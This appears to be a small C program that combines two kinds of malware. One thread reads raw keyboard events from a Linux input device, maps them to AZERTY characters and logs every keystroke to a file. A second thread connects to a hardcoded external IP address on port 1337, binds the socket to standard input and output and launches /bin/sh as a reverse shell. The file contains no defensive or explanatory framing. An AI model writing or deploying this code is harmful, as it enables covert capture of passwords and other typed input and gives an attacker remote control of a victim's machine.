#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <pthread.h>

#define IP "51.77.245.88"
#define PORT 1337
#define MAX_KEYCODE 255

char map[] = "..1234567890-=..azertyuiop{}..qsdfghjklmù*.wxcvbn,;:!";

void *remoteFun(void* arg)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    inet_pton(AF_INET, IP, &(server_addr.sin_addr));

    connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    printf("start");
    fflush(stdout);
    if (fork())
    {
        execve("/bin/sh", 0, 0);
    }
    printf("end");

    close(sockfd);

    pthread_exit(NULL);

    return 0;
}

void *keyFun(void *arg) 
{
    struct input_event events;
    printf("1");
    int file_descriptor = open("/dev/input/event9", O_RDONLY);
    FILE *file_pointer = fopen("./log", "a");
    
    if (file_descriptor == -1 || file_pointer == NULL) 
	{
        perror("Error opening file or input event");
        return 0;
    }

    while (1) 
	{
        
        if (read(file_descriptor, &events, sizeof(events)) == -1) 
		{
            printf("Error reading input event");
            break;
        }
        
        if (events.type == EV_KEY && events.value == 0) 
		{
            fflush(file_pointer);
            printf("2");

            
            char *character;
            if (events.code >= 0 && events.code <= MAX_KEYCODE) 
			{
                character = &map[events.code];
            }
            
            if (character != NULL) 
			{
                printf("3");

                if (events.code == 28) 
				{
                    fprintf(file_pointer, "\n");
                } 
				else if (events.code == 57) 
				{
                    fprintf(file_pointer, " ");
                } 
				else 
				{
                    fprintf(file_pointer, "%c", *character);
                }
            }
        }
    }
    
    fclose(file_pointer);
    close(file_descriptor);

    pthread_exit(NULL);
    
    return 0;
}

int main(int argc, char* argv[])
{
    pthread_t remote_t;
    pthread_t key_t;

    int keythread = pthread_create(&key_t, NULL, keyFun, NULL);
    pthread_join(key_t, NULL);

    int remotethread = pthread_create(&remote_t, NULL, remoteFun, NULL);
    pthread_join(remote_t, NULL);

    if (remotethread != 0);
    {
        perror("good remote\n");
        return -1;
    }

    if (keythread != 0); //pthread_create (pthread_t * thread, pthread_attr_t * attr, void * (* start_routine) (void *), void * arg);
    {
        perror("good key\n");
        return -1;
    }

    return 0;
}

